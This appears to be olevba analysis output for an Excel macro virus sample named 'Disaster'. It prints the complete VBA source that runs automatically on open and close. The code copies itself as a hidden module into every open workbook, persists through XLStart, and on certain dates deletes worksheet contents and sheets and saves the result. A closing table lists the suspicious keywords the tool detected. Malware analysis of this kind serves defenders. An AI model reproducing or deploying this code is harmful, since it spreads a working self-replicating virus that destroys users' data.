olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle4.cls 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle5.cls 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle6.cls 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle7.cls 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle8.cls 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle9.cls 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Disaster.bas 
in file: Virus.MSExcel.Disaster-9cb8999519e2fd328c8dadf468b5eccbd9b94eee - OLE stream: '_VBA_PROJECT_CUR/VBA/Disaster'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.ScreenUpdating = False
Application.OnSheetActivate = ActiveWorkbook.Name & _
"!Disaster.Unvisible"
End Sub

Sub Infect()
Attribute Infect.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Win1
For Each st In Workbooks
For Each sta In st.Modules
If sta.Name = "Disaster" Then
GoTo Win
End If
Next sta
ThisWorkbook.Modules("Disaster").Copy Before:=st.Worksheets(1)
st.Modules("Disaster").Visible = xlVeryHidden
Win:
Next st
Win1:
End Sub


Sub Unvisible()
Attribute Unvisible.VB_ProcData.VB_Invoke_Func = " \n14"
Call Infect
For Each st In Workbooks
For Each sta In st.Modules
If sta.Name = "Disaster" Then
ThisWorkbook.Modules("Disaster").Visible = False
Else
End If
Next sta
Next st
End Sub

Sub Butterfly()
Attribute Butterfly.VB_ProcData.VB_Invoke_Func = " \n14"
Application.DisplayAlerts = False
For Each st In Worksheets
On Error GoTo Wing
st.Worksheets.Add.Name = "A"
Wing:
st.UsedRange.Delete
If st.Name = "A" Then
GoTo Jump
Else
st.Visible = True
st.Delete
Jump:
End If
Next
Application.DisplayAlerts = True
ActiveWorkbook.Save
End Sub

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
Application.DisplayAlerts = False
ThisWorkbook.Save
For Each Fsheet In ThisWorkbook.Worksheets
If Fsheet.Name = "Sheet1" Then
GoTo Wing
End If
Next Fsheet
ThisWorkbook.Worksheets.Add.Name = "Sheet1"
Wing:
For Each st In Worksheets
st.UsedRange.Delete
If st.Name = "Sheet1" Or st.Name = "Sheet2" Or _
st.Name = "Sheet3" Or st.Name = "Sheet4" Or st.Name = "Sheet5" Or _
st.Name = "Sheet6" Or st.Name = "Sheet7" Or st.Name = "Sheet8" Or _
st.Name = "Sheet9" Or st.Name = "Sheet10" Or st.Name = "Sheet11" Or _
st.Name = "Sheet12" Or st.Name = "Sheet13" Or st.Name = "Sheet14" Or _
st.Name = "Sheet15" Or st.Name = "Sheet16" Then
GoTo Jump
Else
st.Visible = True
st.Delete
Jump:
End If
Next
On Error GoTo th
ThisWorkbook.SaveAs fileName:=Application.Path + "\XLStart\Book1.xls"
th:
YourDate = Date
If (Day(YourDate) < 5 And WeekDay(YourDate) = 2) Or (Day(YourDate) > 25 And WeekDay(YourDate) = 6) Then
Call Butterfly
Else
End If
Application.OnSheetActivate = ""
Application.DisplayAlerts = True
Application.ScreenUpdating = True
End Sub

 

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

